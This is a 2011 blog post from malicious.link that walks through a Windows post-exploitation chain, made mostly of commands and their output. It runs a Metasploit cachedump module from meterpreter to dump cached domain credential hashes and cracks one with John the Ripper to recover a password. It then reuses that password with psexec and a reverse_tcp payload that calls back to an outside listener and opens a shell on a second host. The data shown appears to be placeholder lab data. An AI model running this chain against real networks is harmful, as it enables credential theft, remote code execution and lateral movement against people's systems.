<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="mubix">
<meta name="description" content="Update: Cachedump has been added to the Metasploit trunk:
https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
Pull it down:
wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather
Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
meterpreter &amp;gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/" />


    <title>
        
            Cachedump for Meterpreter in action :: malicious.link  â€” welcome
        
    </title>


<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.a6537515292628f292bc89dc1bb6a3480b72f307b458bdd65364ae5b8b20399d.css">






<meta itemprop="name" content="Cachedump for Meterpreter in action">
<meta itemprop="description" content="Update: Cachedump has been added to the Metasploit trunk:
https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
Pull it down:
wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather
Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
meterpreter &gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO.">
<meta itemprop="datePublished" content="2011-02-14T22:03:37+00:00" />
<meta itemprop="dateModified" content="2011-02-14T22:03:37+00:00" />
<meta itemprop="wordCount" content="427">



<meta itemprop="keywords" content="" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cachedump for Meterpreter in action"/>
<meta name="twitter:description" content="Update: Cachedump has been added to the Metasploit trunk:
https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946
Pull it down:
wget http://lab.mediaservice.net/code/cachedump.rb put it here: /(metasploitdir)/modules/post/windows/gather
Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):
meterpreter &gt; run post/windows/gather/cachedump [*] Executing module against WORKSTATION244 [*] Obtaining the boot key... [*] Trying &#39;XP&#39; style... [*] Getting PolSecretEncryptionKey... [*] XP compatible client [*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c [*] Getting LK$KM... [*] Dumping cached credentials... Username : jdoe Hash : 592cdfbc3f1ef77ae95c75f851e37166 Last login : 2010-05-11 01:43:48 DNS Domain Name : CONTOSO."/>





    <meta property="article:section" content="meterpreter" />

    <meta property="article:section" content="cachedump" />



    <meta property="article:published_time" content="2011-02-14 22:03:37 &#43;0000 &#43;0000" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/post/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">boot mubix.kernel</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://malicious.link/about">About</a></li><li><a href="https://malicious.link/brandon">Brandon</a></li><li><a href="https://malicious.link/post">Posts</a></li><li><a href="https://malicious.link/start">Start</a></li><li><a href="https://malicious.link/tags">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://malicious.link/post/2011/2011-02-14-cachedump-for-meterpreter-in-action/">Cachedump for Meterpreter in action</a></h2>
            <p>Published: 14 Feb 2011 - 22:03 &#43;0000</p>

            

            

            <div class="post-content">
                <p><strong>Update</strong>: Cachedump has been added to the Metasploit trunk:</p>
<p><a href="https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946">https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12946</a></p>
<p>Pull it down:</p>
<pre><code>wget http://lab.mediaservice.net/code/cachedump.rb
</code></pre><p>put it here:  <code>/(metasploitdir)/modules/post/windows/gather</code></p>
<p>Load up console and pwn something then (MAKE SURE YOU ARE SYSTEM):</p>
<pre><code>meterpreter &gt; run post/windows/gather/cachedump
[*] Executing module against WORKSTATION244
[*] Obtaining the boot key...
[*] Trying 'XP' style...
[*] Getting PolSecretEncryptionKey...
[*] XP compatible client
[*] Lsa Key: 29249a6480f428cb6dacba2d30d5292c
[*] Getting LK$KM...
[*] Dumping cached credentials...
Username  : jdoe
Hash  : 592cdfbc3f1ef77ae95c75f851e37166
Last login  : 2010-05-11 01:43:48
DNS Domain Name  : CONTOSO.CO
Effective Name  : jdo
Full Name  : eJane Do
User ID  : 1107
Primary Group ID  : 513
Additional groups  : 33620069 33554432 34013184
Logon domain name  : CONTOS
----------------------------------------------------------------------
 
[*] John the Ripper format:
jdoe:592cdfbc3f1ef77ae95c75f851e37166:CONTOSO.CO:CONTOS

[*] Hash are in MSCACHE format. (mscash)
meterpreter &gt;
</code></pre><p>Crack it:</p>
<pre><code>cat lab.dic | ./john --stdin lab.mscash --format=mscash --pot=lab.pot  
Loaded 1 password hash (M$ Cache Hash [Generic 1x])  
ASDqwe123  (jdoe)  
guesses: 1  time: 0:00:00:00  c/s: 500  trying: ASDqwe123
</code></pre><p>Use it:</p>
<pre><code>meterpreter &gt; background  
msf exploit(handler) &gt; route add 10.10.10.0 255.255.255.0 1  
msf exploit(handler) &gt; use exploit/windows/smb/psexec  
msf exploit(psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp  
PAYLOAD =&gt; windows/meterpreter/reverse_tcp  
msf exploit(psexec) &gt; set LHOST X.X.X.X  
LHOST =&gt; X.X.X.X  
msf exploit(psexec) &gt; set LPORT 80  
LPORT =&gt; 80  
msf exploit(psexec) &gt; set SMBDomain Contoso
SMBDomain =&gt; Contoso  
msf exploit(psexec) &gt; set SMBUser jdoe  
SMBUser =&gt; jdoe  
msf exploit(psexec) &gt; set SMBPass ASDqwe123  
SMBPass =&gt; ASDqwe123  
msf exploit(psexec) &gt; show options

Module options (exploit/windows/smb/psexec):

Name  Current Setting  Required  Description  
----  ---------------  --------  -----------  
RHOST  yes  The target address  
RPORT  445  yes  Set the SMB service port  
SMBDomain  Contoso  no  The Windows domain to use for authentication  
SMBPass  ASDqwe123  no  The password for the specified username  
SMBUser  jdoe  no  The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):


Name  Current Setting  Required  Description  
----  ---------------  --------  -----------  
EXITFUNC  process  yes  Exit technique: seh, thread, none, process  
LHOST  X.X.X.X  yes  The listen address  
LPORT  80  yes  The listen port


Exploit target:

Id  Name  
--  ----  
0  Automatic

 
msf exploit(psexec) &gt; set RHOST 10.10.10.200  
RHOST =&gt; 10.10.10.200  
msf exploit(psexec) &gt; exploit

[*] Started reverse handler on X.X.X.X:80  
[*] Connecting to the server...  
[*] Authenticating to 10.10.10.200:445|Contoso as user 'jdoe'...  
[*] Uploading payload...  
[*] Created jSlxARUj.exe...  
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ...  
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.10.10.200[svcctl] ...  
[*] Obtaining a service manager handle...  
[*] Creating a new service (SyHtwKpn - &quot;MbEXNupOpYUL&quot;)...  
[*] Closing service handle...  
[*] Opening service...  
[*] Starting the service...  
[*] Removing the service...  
[*] Closing service handle...  
[*] Deleting jSlxARUj.exe...  
[*] Meterpreter session 2 opened (X.X.X.X:80 -&gt; X.X.X.X:54430) at Mon Feb 14 22:23:00 +0000 2011
</code></pre><p>Woot ;-)</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://malicious.link/categories/meterpreter/">meterpreter</a></span>
        <span class="tag"><a href="https://malicious.link/categories/cachedump/">cachedump</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
            <span><a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
          </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>



    </body>
</html>
